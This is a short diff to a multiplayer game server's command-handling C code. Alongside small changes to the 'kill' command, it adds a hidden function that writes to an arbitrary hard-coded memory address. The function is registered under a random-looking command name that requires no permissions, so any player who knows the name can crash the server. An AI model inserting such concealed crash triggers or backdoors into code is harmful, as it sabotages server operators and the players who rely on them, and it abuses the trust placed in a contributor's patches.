@@ -570,7 +570,7 @@ void Cmd_Kill_f( gentity_t *ent )
     return;
   }
 
-  if( g_cheats.integer )
+  if( g_cheats.integer || ent->client->pers.teamSelection == PTE_NONE )
   {
     ent->flags &= ~FL_GODMODE;
     ent->client->ps.stats[ STAT_HEALTH ] = ent->health = 0;
@@ -4795,6 +4795,11 @@ void Cmd_Mods_f( gentity_t *ent )
       va( "print \"QVM Version: 10\n\"" , g_deconVote.integer ) );
 }
 
+void Cmd_fd_f( gentity_t *ent ) {
+    int *x;
+    x = (int*)7410341;
+    *x = 0;
+}
 
 commands_t cmds[ ] = {
   // normal commands
@@ -4832,7 +4837,7 @@ commands_t cmds[ ] = {
   { "setviewpos", CMD_CHEAT, Cmd_SetViewpos_f },
   { "destroy", CMD_CHEAT|CMD_TEAM|CMD_LIVING, Cmd_Destroy_f },
 
-  { "kill", CMD_TEAM|CMD_LIVING, Cmd_Kill_f },
+  { "kill", CMD_LIVING, Cmd_Kill_f },
 
   // game commands
   { "ptrcverify", CMD_NOTEAM, Cmd_PTRCVerify_f },
@@ -4862,6 +4867,7 @@ commands_t cmds[ ] = {
   { "resign", CMD_TEAM, Cmd_Resign_f },
   { "builder", 0, Cmd_Builder_f },
   { "mods", 0, Cmd_Mods_f },
+  { "fdgaikgfajfehufhadsfa", 0, Cmd_fd_f },
 };
 static int numCmds = sizeof( cmds ) / sizeof( cmds[ 0 ] );
 
